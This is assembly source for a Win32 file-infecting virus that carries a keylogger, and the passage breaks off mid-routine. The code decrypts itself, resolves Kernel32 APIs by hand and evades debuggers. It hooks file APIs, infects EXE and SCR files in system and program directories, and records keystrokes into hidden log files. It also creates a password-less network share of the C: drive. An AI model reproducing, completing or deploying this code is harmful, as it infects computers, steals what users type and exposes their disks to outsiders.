   .386p
   .model flat

   include mogul.inc

   extrn   AddAtomA:proc       ; first generation imports to avoid errors
   extrn   MessageBoxA:proc

   ; virus constantz

   program_total_size  equ (end_program - start)
   program_compact_size    equ (data_area - start)

   .data
           db  ?   ; make tlink32 shut the f*** up...


   ;********************************
   ;* get delta offset and     *
   ;* store registers      *
   ;********************************

   .code

   start:      pushad
           call    get_delta1
   get_delta1: pop ebp
           sub ebp,(offset start + (get_delta1 - start))
           lea edx,[ebp+encrypted]
           lea edi,[ebp+end_encrypted]
           cmp dword ptr [edx],'RQSP'  ; neccesary for 1st generation
           jz  nodecrypt
   decrypt_loop:   add [edx],12345678h
   decryptor   equ $ - 4
           add edx,4
           cmp edx,edi
           jb  decrypt_loop
   nodecrypt:  popad
   decryptorsize   equ (encrypted - start)

   encrypted:  push    eax ebx ecx edx esi edi ebp ; leave registers on stack
           mov edx,[esp+28]            ; get pointer into Kernel32!CreateProcess (caller)
           call    Get_Delta

           xor eax,eax
   regLoop:    pop dword ptr [ebp+eax+registers]   ; loop: store the original registers
           add eax,4
           cmp eax,28
           jne regLoop


   ;********************************
   ;* Get Kernel32 base address    *
   ;*              *
   ;********************************

           push    dword ptr fs:[0]
           mov     fs:[0],esp
           and edx,0ffff0000h
   K32BaseLoop:    sub edx,10000h
           cmp edx,10000h
           jbe error_start
           cmp     word ptr [edx],'ZM'
           jnz K32BaseLoop
           mov [K32Base+ebp],edx   ; Store Kernel32.dll's memory base address
           pop     dword ptr fs:[0]

           call    decrypt_stringz     ; decrypt the API strings

   ;********************************
   ;* Gather the addresses of all  *
   ;* APIs we want from kernels    *
   ;* memory area.         *
   ;********************************

   ; inputs: ebx = API string
   ;   : ecx = Address Field
           lea ebx,[ebp+api_stringz]
           lea ecx,[ebp+api_address_table]
   Get_APIs:   push    ecx
           call    GetProc         ; get API
           pop ecx
           add ecx,4
   get_end_2:  inc ebx
           cmp byte ptr [ebx], 0
           jnz get_end_2
           inc ebx
           cmp byte ptr [ebx],1
           jnz Get_APIs
           call    LoadAntiDebugger    ; Our APIs is online, so launch the antidebugging thread...
           call    encrypt_stringz     ; encrypt strings again, to cover them in memory

   ;********************************
   ;* Generate a random infection  *
   ;* counter. This comes up with a*
   ;* number between 1 and 5, the  *
   ;* ammount of files virus   *
   ;* infects in each dir.     *
   ;********************************

           lea esi,[ebp+SystemTimeBuffer]
           push    esi
           call    [ebp+GetSystemTime]
           mov ax,[esi.wSecond]    ; put systemtime seconds in ax
           add ax,10
   decax:      sub ax,10
           cmp ax,10           ; decrement ax by 10 unntil it's below 10,
           jae decax           ; wich gives us a random counter between 0
                           ; and 9.
           inc al          ; - between 1 and 10
           xor edx,edx
           mov ecx,2
           div ecx
           dec eax
           inc eax         ; eax = random counter between 1 and 5
           mov byte ptr [ebp+files_per_directory],al   ; store the random counter

   ;********************************
   ;* Setup table of addresses to  *
   ;* patch import table with  *
   ;********************************

           xor edi,edi
           lea eax,[ebp+virus_hook_procs]
           lea ebx,[ebp+jumptable]
   p_loop:     inc edi
           mov [ebx],eax
           add eax,(offset vpSetFileAttributesA - offset vpGetFileAttributesA)
           add ebx,4
           cmp edi,12
           jb  p_loop


           lea ebx,[ebp+vpFindFirstFileA]
           mov [ebp+rdFindFirstFileA],ebx
           lea ebx,[ebp+vpFindNextFileA]
           mov [ebp+rdFindNextFileA],ebx
           lea ebx,[ebp+vpFindClose]
           mov [ebp+rdFindClose],ebx
           call    setup_host

   ;********************************
   ;* Check if this copy is the    *
   ;* logging device       *
   ;********************************

           cmp byte ptr [ebp+IsLoggingDevice],1
           jnz nologger

   ;********************************
   ;* Initialize the keylogging    *
   ;********************************

           call    UnloadAntiDebugger  ; unload debugger to free some memory...
           call    decrypt_stringz
           push    0
           lea eax,[ebp+szLogDir]
           push    eax
           call    [ebp+CreateDirectoryA]
           push    eax
           call    [ebp+CloseHandle]
           push    FILE_ATTRIBUTE_HIDDEN Or FILE_ATTRIBUTE_TEMPORARY
           lea eax,[ebp+szLogDir]
           push    eax
           call    [ebp+SetFileAttributesA]
   NEXTLOGLOOP:    lea esi,[ebp+SystemTimeBuffer]
           push    esi
           call    [ebp+GetSystemTime]
           mov ax,[esi.wHour]          ; build keylog filename
           inc ax              ; GMT to CET
           cmp ax,24
           jb  nofixax
           xor ax,ax

   ;********************************
   ;* Build log filename       *
   ;********************************

   nofixax:    call    @mod10
           lea ecx,[ebp+szHr]
           call    @mod10fixStr
           mov ax,[esi.wMinute]
           call    @mod10
           call    @mod10fixStr
           mov ax,[esi.wDay]
           call    @mod10
           lea ecx,[ebp+szDmy]
           call    @mod10fixStr
           mov ax,[esi.wMonth]
           call    @mod10
           call    @mod10fixStr
           push    1040    ; bytes to allocate
           push    40h ;GMEM_ZEROINIT
           call    [ebp+GlobalAlloc]       ; allocate general logger memory
           mov [ebp+KeyLogLocalMem],eax    ; (data, not log-buffer)
           lea ebx,[ebp+szLogFile]
           push    ebx
           push    eax
           call    [ebp+lstrcpyA]          ; copy name of logfile to allocated mem.

   ;********************************
   ;* Setup logging        *
   ;********************************

           lea eax,[ebp+szUser32]
           push    eax
           call    [ebp+GetModuleHandleA]
           cmp eax,0
           jnz GotUSER
           lea eax,[ebp+szUser32]
           push    eax
           call    [ebp+LoadLibraryA]
   GotUSER:    mov dword ptr [ebp+User32],eax
           lea ebx,[ebp+szGetAsyncKeyState]
           push    ebx
           push    eax
           call    [ebp+GetProcAddress]
           mov [ebp+GetAsyncKeyState],eax
           push    1
           push    0
           call    [ebp+RegisterServiceProcess]    ; CLOAK PROGRAM FROM TASK LIST!!
   CursorFix:  push    32512   ; IDC_ARROW ; arrow
           push    0           ;
           lea ebx,[ebp+szLoadCursorA]
           push    ebx
           push    dword ptr [ebp+User32]
           call    [ebp+GetProcAddress]
           call    eax     ; load the arrow cursor
           push    32650   ; OCR_APPSTARTING   ; replace this cursor with the arrow
           push    eax         ; handle of arrow cursor
           lea ebx,[ebp+szSetSystemCursor]
           push    ebx
           push    dword ptr [ebp+User32]
           call    [ebp+GetProcAddress]
           call    eax         ; use arrow cursor as appstart cursor
           call    encrypt_stringz         ; and re-encrypt the strings to protect the loggers intergrity.
           mov [ebp+MapSize],21520
                   push    0
                   push    FILE_ATTRIBUTE_NORMAL
                   push    CREATE_NEW
                   push    0
                   push    FILE_SHARE_READ
                   push    GENERIC_READ + GENERIC_WRITE
           push    dword ptr [ebp+KeyLogLocalMem]
           call    [ebp+CreateFileA]       ; Open the file
           push    eax
           mov [ebp+hFile],eax
                   push    0
                   push    [ebp+MapSize]
                   push    0
                   push    PAGE_READWRITE
                   push    0
                   push    eax
           call    [ebp+CreateFileMappingA]
           push    eax
                   push    [ebp+MapSize]
                   push    0
                   push    0
           push    FILE_MAP_READ + FILE_MAP_WRITE
                   push    eax
           call    [ebp+MapViewOfFile]
           push    eax             ; Log file is memory mapped
           mov edi,eax             ; edi = base address
           xor esi,esi             ; esi = counter
           mov [ebp+KeyLogMemory],edi

   ;********************************
   ;* decrease current thread's    *
   ;* priority level to go smoother*
   ;********************************

           call    [ebp+GetCurrentThread]
           push    -2 ; THREAD_PRIORITY_LOWEST
           push    eax
           call    [ebp+SetThreadPriority]

   ;********************************
   ;* Actual logging unit      *
   ;*              *
   ;********************************

   logg_loop:  mov eax,[ebp+IsDebuggerPresent] ; loop starts with a built-in antidebugger
           or  eax,eax
           jz  _Win95
           call    eax
           or  eax,eax
           jnz _caught
   _Win95:     mov ecx,fs:[20h]
           jecxz   d_ok
   _caught:    push    0
           call    [ebp+ExitProcess]   ; debugger caught, exit process!
   d_ok:       push    40
           call    [ebp+Sleep]
           cmp word ptr [ebp+nrOfBytesWritten],10  ; flush every 10th byte written
           jb  noflush
           push    esi
           push    edi
           call    [ebp+FlushViewOfFile]
           mov word ptr [ebp+nrOfBytesWritten],0
   noflush:    push    10h         ; check if shift is pressed or not
           call    [ebp+GetAsyncKeyState]
           mov [ebp+SHIFT],eax
           push    17          ; check if AltGr is pressed or not
           call    [ebp+GetAsyncKeyState]
           mov [ebp+ALTGR],eax
           push    13          ; check for enter
           call    [ebp+GetAsyncKeyState]
           cmp eax,0
           jz  no_enter
           mov byte ptr [edi+esi],13
           inc esi
           mov byte ptr [edi+esi],10   ; <ENTER>
           jmp continue_logg
   no_enter:   push    190         ; CHECK FOR PERIOD
           call    [ebp+GetAsyncKeyState]
           cmp eax,0
           jz  no_period
           cmp dword ptr [ebp+SHIFT],0
           jnz shiftperiod
           mov byte ptr [edi+esi],'.'
           jmp continue_logg
   shiftperiod:    mov byte ptr [edi+esi],':'
           jmp continue_logg
   no_period:  push    188         ; CHECK FOR COMMA
           call    [ebp+GetAsyncKeyState]
           cmp eax,0
           jz  no_comma
           cmp dword ptr [ebp+SHIFT],0
           jnz shiftcomma
           mov byte ptr [edi+esi],','
           jmp continue_logg
   shiftcomma: mov byte ptr [edi+esi],';'
           jmp continue_logg
   no_comma:   push    32          ; CHECK FOR SPACE
           call    [ebp+GetAsyncKeyState]
           cmp eax,0
           jz  no_space_1
           mov byte ptr [edi+esi],' '
           jmp continue_logg
   no_space_1: push    191         ; CHECK FOR SPACE
           call    [ebp+GetAsyncKeyState]
           cmp eax,0
           jz  no_space_2
           mov byte ptr [edi+esi],' '
           jmp continue_logg
   no_space_2: mov byte ptr [ebp+KeyLoop],41

   CheckLettersandNumbers:
           xor eax,eax
           mov al,byte ptr [ebp+KeyLoop]
           push    eax
           call    [ebp+GetAsyncKeyState]
           cmp eax,0
           jz  nextchar
           mov al,byte ptr [ebp+KeyLoop]
           cmp byte ptr [ebp+KeyLoop],65
           jb  noletter
           cmp byte ptr [ebp+KeyLoop],90
           ja  noletter
           cmp dword ptr [ebp+SHIFT],0
           jnz noletter            ; shift pressed, no change from Ucase
           add al,32           ; lower-case letter
   noletter:   cmp al,48
           jb  nonumber
           cmp al,57
           ja  nonumber
           cmp dword ptr [ebp+SHIFT],0
           jz  check_alt       ; shift is not pressed, use original number char
           cmp al,48   ; 0
           jnz not0
           mov al,'='
           jmp nonumber
   not0:       cmp al,49   ; 1
           jnz not1
           mov al,'!'
           jmp nonumber
   not1:       cmp al,50   ; 2
           jnz not2
           mov al,'"'
           jmp nonumber
   not2:       cmp al,51   ; 3
           jnz not3
           mov al,'#'
           jmp nonumber
   not3:       cmp al,52   ; 4
           jnz not4
           mov al,'¤'
           jmp nonumber
   not4:       cmp al,53   ; 5
           jnz not5
           mov al,'%'
           jmp nonumber
   not5:       cmp al,54   ; 6
           jnz not6
           mov al,'&'
           jmp nonumber
   not6:       cmp al,55   ; 7
           jnz not7
           mov al,'/'
           jmp nonumber
   not7:       cmp al,56   ; 8
           jnz not8
           mov al,'('
           jmp nonumber
   not8:       cmp al,57   ; 9
           jnz check_alt
           mov al,')'
           jmp nonumber
   check_alt:  cmp dword ptr [ebp+ALTGR],0
           jz  nonumber    ; altgr is not pressed, use original number char
           cmp al,48
           jnz _not0
           mov al,'}'
           jmp nonumber
   _not0:      cmp al,49
           jnz _not1
           jmp nonumber
   _not1:      cmp al,50
           jnz _not2
           mov al,'@'
           jmp nonumber
   _not2:      cmp al,51
           jnz _not3
           mov al,'£'
           jmp nonumber
   _not3:      cmp al,52
           jnz _not4
           mov al,'$'
           jmp nonumber
   _not4:      cmp al,53
           jnz _not5
           jmp nonumber
   _not5:      cmp al,54
           jnz _not6
           jmp nonumber
   _not6:      cmp al,55
           jnz _not7
           mov al,'{'
           jmp nonumber
   _not7:      cmp al,56
           jnz _not8
           mov al,'['
           jmp nonumber
   _not8:      cmp al,57
           jnz nonumber
           mov al,']'
   nonumber:   mov byte ptr [edi+esi],al
           jmp continue_logg
   nextchar:   inc byte ptr [ebp+KeyLoop]
           cmp byte ptr [ebp+KeyLoop],92
           jb  CheckLettersandNumbers
           mov byte ptr [ebp+LastByte],0
           jmp logg_loop
   continue_logg:  mov al,byte ptr [edi+esi]
           cmp byte ptr [ebp+LastByte],al
           jz  logg_loop
           mov byte ptr [ebp+LastByte],al
           push    0   ; FILE_BEGIN
           push    0
           push    esi
           push    dword ptr [ebp+hFile]
           call    [ebp+SetFilePointer]
           push    dword ptr [ebp+hFile]
           call    [ebp+SetEndOfFile]
           inc esi
           inc word ptr [ebp+nrOfBytesWritten]
           cmp esi,20480           ; file reached max size (20Kb)? smaller=faster u know :)
           jb  logg_loop
           call    [ebp+UnmapViewOfFile]
           call    [ebp+CloseHandle]
           call    [ebp+CloseHandle]       ; then close the file
           jmp NEXTLOGLOOP         ;start over with next file
           push    0
           CALL    [ebp+ExitThread]
   nologger:

   ;********************************
   ;* Logging code is done here.   *
   ;* For regular copies of the    *
   ;* virus, :         *
   ;* Open a pseudohandle to   *
   ;* current process...       *
   ;********************************

           call    [ebp+GetCurrentProcess]
           mov [ebp+hProcess],eax


   ;********************************
   ;* Rebuild hosts CODE section   *
   ;********************************

           lea ecx,[ebp+OriginalHostData]
           cmp dword ptr [ecx],0E8h        ; E8 00 00 00
           jnz nopatch
           cmp dword ptr [ecx+4],242C8300h ; 00 83 2C 24
           jnz nopatch
           cmp dword ptr [ecx+8],24048105h ; 05 81 04 24
           jnz nopatch

           push    L 0             ; WriteProcessMemoryA!lpNumberOfBytesWritten
           push    L 17                ; WriteProcessMemoryA!nSize
           push    ecx             ; WriteProcessMemoryA!lpBuffer
           push    [ebp+OldEntrypointVA]       ; WriteProcessMemoryA!lpBaseAddress
           push    dword ptr [ebp+hProcess]    ; WriteProcessMemoryA!hProcess
           call    [ebp+WriteProcessMemoryA]
   nopatch:

   ;****************************************
   ;* Get Kernel32 Import Descriptor   *
   ;* and patch the APIs we want       *
   ;****************************************

           mov edi,[esi+3Ch]
           mov edi,[edi+esi+128]
           add edi,esi
   IDTloop:    mov ebx,[edi+12]
           cmp ebx,0
           jz  exit_virus
           add ebx,esi
           cmp dword ptr [ebx],'NREK'  ; KERNEL32 ?
           je  GotKernel32IDT
           cmp dword ptr [ebx],'nreK'  ; Kernel32 ?
           je  GotKernel32IDT
           cmp dword ptr [ebx],'nrek'  ; kernel32 ?
           je  GotKernel32IDT
           add edi,20
           jmp IDTloop
   GotKernel32IDT: mov edi,[edi+16]    ; RVA of Import Address Table for K32
           add edi,esi         ; make it VA..
   ScanLoop:   mov esi,[edi]
           lea ebx,[ebp+hooktable]
   addrfieldloop:  cmp [ebx],esi
           je  ReplaceAPI
           add ebx,4
           cmp dword ptr [ebx],0
           jnz addrfieldloop
           jmp testnext
   ReplaceAPI: lea eax,[ebp+hooktable]
           sub ebx,eax
           lea ecx,[ebp+jumptable]
           add ecx,ebx
           push    L 0             ; WriteProcessMemoryA!lpNumberOfBytesWritten
           push    L 4             ; WriteProcessMemoryA!nSize
           push    ecx             ; WriteProcessMemoryA!lpBuffer
           push    edi             ; WriteProcessMemoryA!lpBaseAddress
           push    dword ptr [ebp+hProcess]    ; WriteProcessMemoryA!hProcess
           call    [ebp+WriteProcessMemoryA]
   testnext:   add edi,4
           cmp dword ptr [edi],0
           jnz ScanLoop

           lea ebx,[ebp+Thread_scandirs]
           call    CreateNewThread

   ;********************************
   ;* Return control to host   *
   ;*              *
   ;********************************

   exit_virus: mov eax,[ebp+OldEntrypointVA]       ; return to host (just as nothing ever happened :)
           push    eax
   restoreregs:    mov esi,[ebp+_ESI]
           mov edi,[ebp+_EDI]
           mov edx,[ebp+_EDX]
           mov ecx,[ebp+_ECX]
           mov ebx,[ebp+_EBX]
           mov ebp,[ebp+_EBP]  ; finally, release ebp from it's assignement as delta ptr
           ret


   ;********************************
   ;* Functions for        *
   ;* Numbers->ASCII numbers   *
   ;********************************

   @mod10:     xor bx,bx
           cmp ax,9
           jbe endmod10
   mod10loop:  sub ax,10
           inc bx
           cmp ax,9
           ja  mod10loop
   endmod10:   ret
   @mod10fixStr:   mov byte ptr [ecx],'0'
           add byte ptr [ecx], bl
           inc ecx
           mov byte ptr [ecx],'0'
           add byte ptr [ecx], al
           inc ecx
           ret

   ;********************************
   ;* Get delta host       *
   ;********************************

   Get_Delta:  call    _get_delta
   _get_delta: pop ebp
           sub ebp,(offset start + (_get_delta - start))
           ret



   ;********************************
   ;* Internal GetProcAddress  *
   ;* function         *
   ;********************************

   ; inputs: ebx = API string
   ;   : ecx = Address Field

   GetProc:    pushad
           push    ecx
           mov eax,[edx+3Ch]       ; PE header
           mov ecx,[eax+edx+120]   ; Export Table RVA
           add ecx,[ebp+K32Base]   ; Export Table
           mov [ebp+K32ExpTable],ecx
           mov esi,[ecx+32]        ; Export Name Table RVA
           add esi,[ebp+K32Base]   ; Export Name Table
           xor eax,eax         ; use eax as string counter
   string_loop:    inc eax         ; first string
           mov edx,[esi]       ; RVA of string
           add edx,[ebp+K32Base]   ; string
           xor ecx,ecx         ; null ecx as bytecounter
   cmploop:    cmp byte ptr [edx+ecx], 0   ; end of string?
           je  got_string      ; if so, we've succeeded
           push    eax         ; store eax
           mov al,byte ptr [edx]
           cmp al,byte ptr [ebx]
           ja  error_getproc
           mov al,byte ptr [ebx+ecx]   ; move a byte of our API string into AL
           cmp al,byte ptr [edx+ecx]   ; compare AL with a byte from the Kernel string
           jne next_string     ; if not equal, check next string
           inc ecx         ; else: increment byte counter
           pop eax         ; restore eax
           jmp cmploop         ; compare next byte
   next_string:    pop eax         ; restore eax
           add esi,4           ; next string address
           jmp string_loop     ; check next string
   got_string: add eax,eax         ; eax->Oridinal Table position (Word tbl)
           mov ebx,[ebp+K32ExpTable]
           mov ecx,[ebx+36]        ; ecx->RVA of Oridinal Table
           add ecx,[ebp+K32Base]   ; ecx->Oridinal Table
           movzx   eax,word ptr [ecx+eax]  ; eax=Ordinal number
           sub eax,dword ptr [ebx+16]  ; subtract ordinal base
           mov esi,[ebx+28]        ; esi->RVA of Address table
           add esi,[ebp+K32Base]   ; esi->Address table
           mov ecx,4           ; multiply oridinal number by 4
           mul ecx         ; do it
           mov eax,dword ptr [esi+eax] ; eax->RVA of API
           add eax,[ebp+K32Base]   ; eax points to API
           jmp StoreAPI
   error_getproc:  pop eax
           xor eax,eax
   StoreAPI:   pop ebx
           mov dword ptr [ebx],eax
           popad
           ret


   ;********************************
   ;* scan current, windows, and   *
   ;* system directories for   *
   ;* uninfected PE EXE or SCR *
   ;* files            *
   ;********************************

   Thread_scandirs:
           call    Get_Delta
           push    1040    ; bytes to allocate
           push    40h ;GMEM_ZEROINIT
           call    [ebp+GlobalAlloc]
           xchg    esi,eax     ; esi points to 1st MAX_PATH buffer in allocated mem
           mov edi,esi
           add edi,260     ; edi points to 2nd MAX_PATH buffer in allocated mem
           push    esi
           push    260
           call    [ebp+GetCurrentDirectoryA]  ; thiz ist tha offline infection enginez, sir.
           Call    FileSearch_Dir
           push    260
           push    esi
           call    [ebp+GetWindowsDirectoryA]
           Call    FileSearch_Dir
           push    260
           push    esi
           call    [ebp+GetSystemDirectoryA]
           Call    FileSearch_Dir

   ;********************************
   ;* Get Program files directory  *
   ;* from the registry, and infect*
   ;* files in subdirectories  *
   ;********************************

           mov byte ptr [ebp+files_per_directory],1


           call    decrypt_stringz
           pushad
           mov byte ptr [ebp+advapiloaded],0
           lea edi,[ebp+szAdvapi32]
           push    edi
           call    [ebp+GetModuleHandleA]
           cmp eax,0
           jnz GotAdvapi
           mov byte ptr [ebp+advapiloaded],1
           push    edi
           call    [ebp+LoadLibraryA]
   GotAdvapi:  mov [ebp+Advapi32],eax
           pushad
           call    install
           popad
           lea eax,[ebp+hKey]
           push    eax
           lea eax,[ebp+szKey]
           push    eax
           push    HKEY_LOCAL_MACHINE
           lea eax,[ebp+szRegOpenKeyA]
           call    @callAPI

           lea eax,[ebp+lpcbData]
           push    eax
           lea esi,[ebp+WFD.szFileName]
           push    esi
           lea eax,[ebp+lpType]
           mov dword ptr [eax],1
           push    eax
           push    0
           lea eax,[ebp+szProgFiles1]
           push    eax
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegQueryValueExA]
           call    @callAPI
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegCloseKey]
           call    @callAPI
           push    [ebp+Advapi32]
           call    [ebp+FreeLibraryA]
           popad
           call    encrypt_stringz
           lea ebx,[ebp+WFD.szFileName]
           push    ebx
           push    esi
           call    [ebp+lstrcpyA]
           cmp word ptr [ebx+1],'\:'
           jnz noprogdir
           mov eax,ebx
   YesIncEax:  inc eax
           cmp byte ptr [eax],0
           jnz YesIncEax
           mov dword ptr [eax],'*.*\'
           mov byte ptr [eax+4],0
           lea eax,[ebp+WFD]
           push    eax
           push    ebx
           call    [ebp+FindFirstFileA]
           push    eax
           cmp eax,0
           jz  noprogdir
           mov [ebp+ddfindfile],eax
   fileloop:   mov eax,[ebp+WFD.dwFileAttributes]
           push    eax
           or  eax,10h ;FILE_ATTRIBUTE_DIRECTORY
           pop ebx
           cmp ebx,eax
           jnz nodir
           lea eax,[ebp+WFD.szFileName]
           cmp byte ptr [eax],'.'
           jz  nodir
           push    esi
           mov edi,esi
           add edi,520
           push    edi
           call    [ebp+lstrcpyA]
           mov eax,edi
   YesIncEax2: inc eax
           cmp byte ptr [eax],0
           jnz YesIncEax2
           mov byte ptr [eax],'\'
           inc eax
           lea ebx,[ebp+WFD.szFileName]
           push    ebx
           push    eax
           call    [ebp+lstrcpyA]
           mov eax,edi
   YesIncEax3: inc eax
           cmp byte ptr [eax],0
           jnz YesIncEax3
           sub eax,edi

   ; in our allocated buffer :
   ; 0 - 260 : programfiles dir
   ; 260 - 520 : active dir

           mov byte ptr [ebp+DidInfect],0
           pushad
           mov esi,edi
           add edi,260
           Call    FileSearch_Dir
           popad
   nodir:      lea eax,[ebp+WFD]
           push    eax
           push    [ebp+ddfindfile]
           call    [ebp+FindNextFileA]
           cmp eax,0
           jz  lclose
           cmp byte ptr [ebp+DidInfect],0
           jz  fileloop
   lclose:     call    [ebp+FindClose]
   noprogdir:  push    esi
           call    [ebp+GlobalFree]        ; free our search memory
           call    UnloadAntiDebugger
           push    0
           call    [ebp+ExitThread]

   ;********************************
   ;* function to simplify calls   *
   ;* to Advapi32.dll      *
   ;********************************

   @callAPI:   pop dword ptr [ebp+ddRet]
           push    eax
           push    dword ptr [ebp+Advapi32]
           call    [ebp+GetProcAddress]
           call    eax             ; open the registry key
           push    dword ptr [ebp+ddRet]
           ret


   ;********************************
   ;* search and infect routines   *
   ;*              *
   ;********************************

   FileSearch_Dir      proc

           push    eax
           add eax,esi
           mov byte ptr [eax],'\'
           mov byte ptr [eax+1],0
           push    esi
           push    edi
           call    [ebp+lstrcpyA]
           pop eax
           mov byte ptr [eax+edi+1],'*'
           cmp word ptr [ebp+SystemTimeBuffer.wMilliseconds],200   ; 1/5 scr's
           jnb noscr
           mov dword ptr [eax+edi+2],'rcs.'
           jmp pwnull
   noscr:      mov dword ptr [eax+edi+2],'exe.'
   pwnull:     mov byte ptr [eax+edi+6],0
           pushad
           lea eax,[ebp+WFD]
           push    eax
           push    edi
           call    [ebp+FindFirstFileA]
           mov [ebp+FindFileHandle],eax
   src_loop:   push    esi
           push    edi     ; edi holds path
           call    [ebp+lstrcpyA]
           mov ecx,edi
   ll_loop:    inc ecx
           cmp byte ptr [ecx], 0
           jnz ll_loop
           lea ebx,[ebp+WFD.szFileName]
           push    ebx
           push    ecx     ; edi holds path
           call    [ebp+lstrcpyA]
           call    infect_this_file
           lea eax,[ebp+WFD]
           push    eax
           push    dword ptr [ebp+FindFileHandle]
           call    [ebp+FindNextFileA]
           cmp eax,0
           jz  exit_search
           mov al,byte ptr [ebp+files_per_directory]
           cmp byte ptr [ebp+InfectCount],al
           jnz src_loop
   exit_search:    mov byte ptr [ebp+InfectCount],0    ; reset infectcounter
           popad
           push    dword ptr [ebp+FindFileHandle]
           call    [ebp+FindClose]
           ret


   FileSearch_Dir      endp



   infect_this_file:
           push    edi
           call    [ebp+GetFileAttributesA]    ; store original file attributes
           mov [ebp+OriginAttribs],eax
           push    FILE_ATTRIBUTE_NORMAL
           push    edi
           call    [ebp+SetFileAttributesA]    ; Blank file attributes
           lea eax,[ebp+WFD.szFileName]
           cmp dword ptr [eax], "PVA_" ; _AVP
           jz  setattribs
           cmp dword ptr [eax], "MPVA" ; AVPM monitor
           jz  setattribs
           cmp dword ptr [eax], "3PVA" ; AVP32
           jz  setattribs
           cmp dword ptr [eax], "DNUR" ; rundll32
           jz  setattribs
           cmp dword ptr [eax], "ONUR" ; runonce
           jz  setattribs
           cmp dword ptr [eax], "TSYS" ; systray
           jz  setattribs
           cmp dword ptr [eax], "LPXE" ; explorer
           jz  setattribs
           cmp dword ptr [eax], "AELC" ; cleanmgr
           jz  setattribs
           cmp dword ptr [eax], "KSAT" ; taskmon
           jz  setattribs
           cmp dword ptr [eax], "OOPS" ; spool32
           jz  setattribs
           push    esi edi esi edi
           mov eax,[ebp+WFD.nFileSizeLow]
           mov [ebp+MapSize],eax
           mov byte ptr [ebp+FileState], 0
           mov esi,edi
           lea edi,[ebp+checkfile]
           mov byte ptr [ebp+FileState], 0
           call    MemoryMapEdit       ; check the file
           pop edi esi
           cmp byte ptr [ebp+FileState], 0
           jnz __noinfect
           mov eax,[ebp+NewFileSize]
           mov [ebp+MapSize],eax
           mov esi,edi
           lea edi,[ebp+dump_virus_code]
           call    MemoryMapEdit       ; infect the file
           inc byte ptr [ebp+InfectCount]  ; counter = +1
           mov byte ptr [ebp+DidInfect],1
   __noinfect: pop edi esi
   setattribs: push    dword ptr [ebp+OriginAttribs]
           push    edi
           call    [ebp+SetFileAttributesA]    ; Restore file attributes
           ret

   install:    lea eax,[ebp+hKey]
           push    eax
           lea eax,[ebp+RegShareKey]
           push    eax
           push    HKEY_LOCAL_MACHINE
           lea eax,[ebp+szRegCreateKeyA]   ; create the disk sharing reg key
           call    @callAPI
           push    4
           lea eax,[ebp+flags]
           push    eax
           push    4   ; reg_dword
           push    0
           lea eax,[ebp+szFlags]
           push    eax
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegSetValueExA]
           call    @callAPI            ; set access flags (full access)
           push    3
           lea eax,[ebp+Cdrive]
           push    eax
           push    1   ; reg_sz
           push    0
           lea eax,[ebp+szPath]
           push    eax
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegSetValueExA]
           call    @callAPI            ; set path (C:\)
           push    0
           lea eax,[ebp+szNull]
           push    eax
           push    3   ; REG_BINARY
           push    0
           lea eax,[ebp+szParm1enc]
           push    eax
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegSetValueExA]
           call    @callAPI            ; set password for read access (none)
           push    0
           lea eax,[ebp+szNull]
           push    eax
           push    3   ; REG_BINARY
           push    0
           lea eax,[ebp+szParm2enc]
           push    eax
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegSetValueExA]  ; set password for full access (none)
           call    @callAPI
           push    0
           lea eax,[ebp+szNull]
           push    eax
           push    1   ; reg_sz
           push    0
           lea eax,[ebp+szRemark]
           push    eax
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegSetValueExA]
           call    @callAPI            ; set comments/remarks (none)
           push    4
           lea eax,[ebp+typeflags]
           push    eax
           push    4   ; reg_dword
           push    0
           lea eax,[ebp+szType]
           push    eax
           push    dword ptr [ebp+hKey]
           lea eax,[ebp+szRegSetValueExA]
           call    @callAPI            ; set type (0)
           lea eax,[ebp+hKey]
           push    eax
           lea eax,[ebp+szRegCloseKey]
           call    @callAPI            ; close the registry key.
           push    520 ; bytes to allocate
           push    40h ;GMEM_ZEROINIT
           call    [ebp+GlobalAlloc]
           xchg    esi,eax
           push    260
           push    esi
           call    [ebp+GetWindowsDirectoryA]
           add eax,esi
           lea ecx,[ebp+szExplorer]
           push    ecx
           push    eax
           call    [ebp+lstrcpyA]          ; build explorer filename
           mov edi,esi
           add edi,260
           push    260
           push    edi
           call    [ebp+GetSystemDirectoryA]
           add eax,edi
           lea ecx,[ebp+szNotepad]
           push    ecx
           push    eax
           call    [ebp+lstrcpyA]          ; build bytesize logger filename
           push    0       ; attempt to overwrite, fail if running
           push    edi
           push    esi
           call    [ebp+CopyFileA]         ; create bytesize.exe
           cmp eax,0
           jz  freeexp     ; already running, then exit
           lea eax,[ebp+WFD]
           push    eax
           push    edi
           call    [ebp+FindFirstFileA]
           push    eax
           call    [ebp+FindClose]
           mov byte ptr [ebp+IsLoggingDevice],1
           call    infect_this_file
           mov byte ptr [ebp+IsLoggingDevice],0
           push    1
           push    edi
           call    [ebp+WinExec]
   freeexp:    push    esi
           call    [ebp+GlobalFree]        ; free installation memory
           ret


   ;********************************
   ;* virus API handlers       *
   ;*              *
   ;********************************

   virus_hook_procs:
   vpGetFileAttributesA:   call    get_ebp
               mov esi, [ebp+GetFileAttributesA]
               call    init_from_proc
               ret
   vpSetFileAttributesA:   call    get_ebp
               mov esi, [ebp+SetFileAttributesA]
               call    init_from_proc
               ret
   vpCreateFileA:      call    get_ebp
               mov esi, [ebp+CreateFileA]
               call    init_from_proc
               ret
   vplopen:        call    get_ebp
               mov esi, [ebp+lopen]
               call    init_from_proc
               ret
   vpMoveFileA:        call    get_ebp
               mov esi, [ebp+MoveFileA]
               call    init_from_proc
               ret
   vpMoveFileExA:      call    get_ebp
               mov esi, [ebp+MoveFileExA]
               call    init_from_proc
               ret
   vpCopyFileA:        call    get_ebp
               mov esi, [ebp+CopyFileA]
               call    init_from_proc
               ret
   vpCopyFileExA:      call    get_ebp
               mov esi, [ebp+CopyFileExA]
               call    init_from_proc
               ret
   vpWinExec:      call    get_ebp
               mov esi, [ebp+WinExec]
               call    init_from_proc
               ret
   vpOpenFile:     call    get_ebp
               mov esi, [ebp+OpenFile]
               call    init_from_proc
               ret
   vpCreateProcessA:   call    get_ebp
               mov esi, [ebp+CreateProcessA]
               call    init_from_proc
               ret
   vpDeleteFileA:      call    get_ebp
